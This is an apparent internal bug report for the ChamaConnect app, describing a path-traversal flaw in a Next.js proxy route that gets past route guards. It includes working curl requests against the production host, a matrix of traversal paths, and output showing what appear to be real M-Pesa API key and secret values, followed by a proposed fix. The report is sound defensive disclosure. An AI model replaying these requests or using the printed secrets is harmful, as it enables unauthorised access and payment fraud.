<p align="center">
  <img src="https://chamaconnect.io/images/chamaconnect.svg" alt="ChamaConnect" />
</p>

# BUG-044 — Path traversal: `GET /api/proxy/groups/../settings` resolves to `/api/proxy/settings` (bypasses route guards)

| Field | Value |
|---|---|
| Severity | **Critical (route-guard bypass via path traversal)** |
| Surface | API / routing |
| Status | Open |
| Discovered | 2026-04-20 |
| Discovered by | Manual (curl) |

## Evidence

The Next.js proxy route handler normalises `..` segments in the URL path before forwarding to the backend, turning `groups/../settings` into `settings`. Any endpoint reachable under `/api/proxy/` is therefore reachable from **any other prefix via `..` segments** — making every per-route guard useless from a defence-in-depth perspective.

```bash
# Direct path — returns full settings + M-Pesa credentials (BUG-028)
$ curl -sS -H "authorization: Bearer $USER_TOKEN" \
    https://chamaconnect.io/api/proxy/groups/../settings
{"message":"Successfully retrieved settings","data":[{"mpesaC2bConsumerKey":"drm11CDSDh3jXE5qKcb3rWnqQLh2T04QVumhlANLWob8dkQn","mpesaC2bConsumerSecret":"YeNGcC6ebvT3y4yVsDcMmk5MPpHmNVASC3IZxhjVj2Cx61vPpk5gkvBaA7R7FquW",...}]}
# HTTP 200

# URL-encoded variant — also works
$ curl -sS -H "authorization: Bearer $USER_TOKEN" \
    https://chamaconnect.io/api/proxy/groups/%2e%2e%2fsettings
# HTTP 200 — same response

# All traverse combinations confirmed working:
groups/../settings          → 200  (settings + M-Pesa credentials)
groups/../transactions       → 200  (all transactions across all chamas)
groups/../roles              → 200  (full role list)
groups/../permissions        → 201  (role list via permissions route bug)
groups/../notifications      → 200  (user notifications)
users/../settings            → 200  (settings + M-Pesa credentials)
users/../roles               → 200  (role list)
users/../transactions        → 200  (all transactions)
transactions/../settings     → 200  (settings + M-Pesa credentials)
roles/../settings            → 200  (settings + M-Pesa credentials)
settings/../transactions     → 200  (all transactions)
```

The traversal bypasses the intended route handler: if a future fix adds `requireRole('SuperAdmin')` to `GET /api/proxy/settings`, any user who knows the traversal pattern can still reach `GET /api/proxy/groups/../settings` without the guard.

## User impact

This makes **every future route-level security fix potentially moot** unless the traversal is closed first. Concretely, right now it provides three additional unauthenticated-user-level paths to the M-Pesa credentials (on top of BUG-028 and BUG-042) and to the full transaction ledger (on top of BUG-030).

Beyond the immediate credential leak, the traversal pattern is a force multiplier: any endpoint that currently has a working role guard can have that guard bypassed by any caller who reaches a sibling path that lacks the guard.

## Root cause

The Next.js API proxy route handler (`/api/proxy/[...slug]/route.ts` or similar catch-all) resolves the slug array, joins segments with `/`, and passes the resulting path to the upstream backend. The `..` resolution is performed either by Node's `path.join` (which normalises) or by the fetch/axios call (which the backend's URL parser normalises). Neither layer rejects traversal sequences before the backend handler is selected.

```ts
// likely pattern in /api/proxy/[...slug]/route.ts
const upstream = `${BACKEND_URL}/${params.slug.join('/')}`;   // groups/../settings → settings
const resp = await fetch(upstream, { ... });
```

## Proposed fix

1. **Sanitise the slug before forwarding** — reject any request containing `..` or `%2e`:

```ts
// /api/proxy/[...slug]/route.ts
export async function GET(req: NextRequest, { params }: { params: { slug: string[] } }) {
  const slug = params.slug;
  if (slug.some((s) => s === '..' || s === '.' || decodeURIComponent(s).includes('..'))) {
    return NextResponse.json({ status: 'error', message: 'Not Found' }, { status: 404 });
  }
  const path = slug.join('/');
  // ...forward
}
```

2. Apply the same guard in Nginx/Cloudflare — add a WAF rule that blocks any request whose normalised URL path differs from the raw URL path, or that contains `%2e%2e` / `../` after the `/api/proxy/` prefix.

3. **Do not rely on route-level guards as the sole defence** — add authorisation checks inside each handler so the access control is enforced regardless of which URL path is used to reach it.

## Verification

1. `curl .../api/proxy/groups/../settings` → `404 Not Found`.
2. `curl .../api/proxy/groups/%2e%2e%2fsettings` → `404 Not Found`.
3. After fixing, re-run the full traversal matrix from evidence above — all 10 paths return `404`.
4. Regression test in `/recon/tests/path-traversal.spec.ts`.
